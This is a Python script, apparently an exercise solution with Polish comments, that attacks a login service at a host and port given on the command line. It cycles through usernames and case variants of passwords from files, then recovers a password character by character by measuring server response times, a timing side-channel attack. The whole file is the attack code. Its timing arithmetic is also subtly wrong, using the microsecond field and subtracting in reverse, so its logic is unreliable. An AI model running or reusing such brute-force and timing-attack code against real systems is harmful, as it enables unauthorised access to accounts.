import itertools
import sys
import socket
import string
import json
from datetime import datetime

def brute_force():
    ingredients = string.ascii_uppercase + string.ascii_lowercase + '1234567890'
    product = itertools.product(ingredients, repeat=1)
    for i in product:
        yield i

def password_base(l):
    with open('passwords.txt', 'r') as f:
        for line in list(f)[l:l+1]:
            #print(line.strip())
            word = line[:-1]
            word_upper = line.upper()[:-1]
            # print(word)
            # print(word_upper)
            passwords = map(''.join, itertools.product(*zip(word, word_upper)))
            for password in passwords:
                yield password

def login_base():
    with open('logins.txt', 'r') as logins:
        for login in list(logins):
            yield login.strip()

def connection():
    connection = socket.socket()
    # pobieranie adresu z argumentu podanego przy wywołaniu
    address = sys.argv[1]
    # pobieranie portu z argumentu
    port = int(sys.argv[2])
    # łączenie
    connection.connect((address, port))
    str_response = {"result": ""}
    #i = 0
    for suppose_login in login_base():
        login_data = {"login": suppose_login, "password": ' '}
        json_login_data = json.dumps(login_data)
        # wysyłanie wiadomości czyli loginu bez hasła
        connection.send((json_login_data.encode()))
        start = datetime.now().microsecond
        # pobieranie odpowiedzi, login się zgadza lub nie
        response = connection.recv(1024)
        end = datetime.now().microsecond
        difference = end - start
        str_response = json.loads(response.decode())
        if str_response["result"] == "Wrong password!":
            login = suppose_login
            suppose_password = ''
            password = ''
            while(True):
                generator = brute_force()
                for i in generator:
                    suppose_password += i[0]
                    login_data = {"login": login, "password": suppose_password}
                    json_login_data = json.dumps(login_data)
                    # wysyłanie wiadomości czyli hasła
                    connection.send((json_login_data.encode()))
                    start = datetime.now().microsecond
                    response = connection.recv(1024)
                    end = datetime.now().microsecond
                    difference_password = start - end
                    str_response = json.loads(response.decode())
                    if difference_password > difference:
                        password = suppose_password
                        break
                    # if str_response["result"] == "Exception happened during login":
                    #     # suppose_password += i[0]
                    #     password = suppose_password
                    #     break
                    # elif difference_password <= difference:
                    #     suppose_password = password
                    #     continue
                    elif str_response["result"] == "Wrong password!":
                        suppose_password = password
                        continue
                    elif str_response["result"] == "Connection success!":
                        password = suppose_password
                        print(json.dumps({"login": login, "password": password}))
                        exit(0)
    connection.close()

connection()